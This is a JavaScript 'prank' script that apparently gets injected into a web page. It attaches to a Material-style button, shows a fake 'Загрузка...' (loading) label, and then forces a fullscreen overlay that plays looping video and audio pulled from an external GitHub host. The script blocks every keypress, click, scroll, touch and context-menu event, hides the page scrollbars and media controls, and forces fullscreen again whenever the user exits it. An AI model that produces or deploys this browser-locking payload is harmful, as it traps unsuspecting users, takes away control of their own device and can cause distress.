(function() {
    const VIDEO_URL = 'https://github.com/thisisban/thisisban.github.io/raw/refs/heads/main/src/video.mp4';
    const AUDIO_URL = 'https://github.com/thisisban/thisisban.github.io/raw/refs/heads/main/src/audio.mp3';
    
    const container = document.createElement('div');
    container.id = 'prankContainer';
    container.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        display: none;
        background: black;
        z-index: 999999;
    `;
    
    const video = document.createElement('video');
    video.id = 'prankVideo';
    video.style.cssText = 'width: 100%; height: 100%; object-fit: cover;';
    video.playsInline = true;
    video.webkitPlaysInline = true;
    
    const videoSource = document.createElement('source');
    videoSource.src = VIDEO_URL;
    videoSource.type = 'video/mp4';
    video.appendChild(videoSource);
    
    const audio = document.createElement('audio');
    audio.id = 'prankAudio';
    audio.style.display = 'none';
    audio.loop = true;
    
    const audioSource = document.createElement('source');
    audioSource.src = AUDIO_URL;
    audioSource.type = 'audio/mpeg';
    audio.appendChild(audioSource);
    
    container.appendChild(video);
    container.appendChild(audio);
    document.body.appendChild(container);
    
    function requestFullscreen(element) {
        if (element.requestFullscreen) {
            return element.requestFullscreen();
        } else if (element.webkitRequestFullscreen) {
            return element.webkitRequestFullscreen();
        } else if (element.mozRequestFullScreen) {
            return element.mozRequestFullScreen();
        } else if (element.msRequestFullscreen) {
            return element.msRequestFullscreen();
        }
        return Promise.reject('Fullscreen not supported');
    }
    
    function blockEscapeAndControls() {
        document.addEventListener('keydown', function(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        }, {capture: true, passive: false});
        
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        }, {capture: true});
        
        document.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        }, {capture: true, passive: false});
        
        document.addEventListener('wheel', function(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        }, {capture: true, passive: false});
        
        document.addEventListener('touchstart', function(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        }, {capture: true, passive: false});
        
        document.addEventListener('fullscreenchange', function(e) {
            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                requestFullscreen(container);
            }
        }, {capture: true});
        
        document.addEventListener('webkitfullscreenchange', function(e) {
            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                requestFullscreen(container);
            }
        }, {capture: true});
    }
    
    const button = document.querySelector('.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.LQeN7.MjT6xe.sOCCfd.brKGGd.BhQfub.zwjsl');
    
    if (button) {
        button.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            button.innerHTML = '<span class="VfPpkd-vQzf8d">Загрузка...</span>';
            
            video.load();
            audio.load();
            
            setTimeout(() => {
                button.style.display = 'none';
                
                container.style.display = 'block';
                
                blockEscapeAndControls();
                
                requestFullscreen(container)
                    .then(() => {
                        console.log('Fullscreen activated');
                        
                        video.muted = true;
                        video.play()
                            .then(() => {
                                console.log('Video started');
                                
                                setTimeout(() => {
                                    video.muted = false;
                                    audio.play()
                                        .then(() => console.log('Audio started'))
                                        .catch(err => console.error('Audio play failed:', err));
                                }, 1000);
                            })
                            .catch(err => {
                                console.error('Video play failed:', err);
                                video.muted = false;
                                video.play().catch(e => console.error('Retry failed:', e));
                            });
                    })
                    .catch(err => {
                        console.log('Fullscreen failed, falling back:', err);
                        container.style.display = 'block';
                        video.muted = true;
                        video.play()
                            .then(() => {
                                setTimeout(() => {
                                    video.muted = false;
                                    audio.play().catch(e => console.error('Audio fallback failed:', e));
                                }, 1000);
                            })
                            .catch(e => console.error('Video fallback failed:', e));
                    });
                    
                video.addEventListener('ended', function() {
                    video.currentTime = 0;
                    video.play();
                });
                
            }, 500);
        });
    }
    
    const style = document.createElement('style');
    style.textContent = `
        html, body {
            overflow: hidden !important;
        }
        #prankContainer video::-webkit-media-controls {
            display: none !important;
        }
        #prankContainer video::-webkit-media-controls-enclosure {
            display: none !important;
        }
    `;
    document.head.appendChild(style);
})();
